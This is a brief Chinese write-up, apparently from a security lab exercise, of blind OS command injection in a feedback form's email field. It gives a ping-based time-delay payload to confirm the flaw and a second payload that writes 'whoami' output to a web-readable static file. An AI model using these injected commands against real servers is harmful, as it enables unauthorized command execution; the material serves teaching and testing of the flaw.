提交反馈处存在os命令注入



验证paylaod:

```javascript
email=||ping+-c+10+127.0.0.1+||
```



延时10秒返回参数，说明漏洞存在



该漏洞无法回显命令执行信息，但是可以利用输出重定向将敏感信息输出到静态文件中

payload:

```javascript
email=||+whoami+>+/var/www/images/output.txt+||
```



访问静态文件即可得到whoami信息